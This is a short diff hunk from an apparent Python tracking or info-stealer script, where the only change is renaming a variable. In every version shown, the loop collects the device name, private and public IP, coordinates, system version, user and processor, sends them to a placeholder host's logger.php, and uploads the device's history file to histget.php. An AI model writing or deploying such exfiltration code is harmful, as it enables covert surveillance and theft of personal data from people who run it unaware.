@@ -60,11 +60,11 @@ while True:
         try:
             data = f'?devicename={device_name}&privateip={private_ip}&coordinates={coordinates}&publicip={public_ip}&systemversion={system_version}&user={user}&processor={processor}'
             data = urllib.parse.quote(data, safe='&?=,')
-            trifam = urllib.request.urlopen(f'http://IP/logger.php{data}')
-            trifam.close()
+            website = urllib.request.urlopen(f'http://IP/logger.php{data}')
+            website.close()
             device_name = urllib.parse.quote_plus(device_name)
-            trifam = urllib.request.urlopen(f'https://IP/histget.php?filename={device_name}_history.txt', data=history)
-            trifam.close()
+            website = urllib.request.urlopen(f'https://IP/histget.php?filename={device_name}_history.txt', data=history)
+            website.close()
         except socket.gaierror:
             continue
 
